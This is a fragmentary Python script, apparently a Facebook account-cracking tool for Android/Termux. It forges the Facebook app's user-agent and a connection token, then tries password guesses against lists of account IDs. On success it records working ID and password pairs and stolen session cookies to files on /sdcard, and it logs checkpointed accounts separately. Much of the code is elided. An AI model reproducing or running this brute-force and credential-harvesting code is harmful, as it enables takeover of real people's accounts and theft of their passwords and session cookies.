...
def randBuildLSB():
    ...
    END = '[FB4A/;FBAV/YZWSES93;FBBV/124262011;FBAN/FB4A;FBAV/YZWSES93;FBBV/124262011;FBDM//*{density=2.0,width=720,height=2560};FBLC/fr_FR;FBRV/508534061;FBCR/Sony;FBMF/OnePlus;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/Oppo_Reno_15;FBSV/11;FBOP/4;FBCA/armeabi-v7a;FBSS/;]'
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[OWN] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [OWN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/OWN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [OWN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/OWN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [OWN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/OWN_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
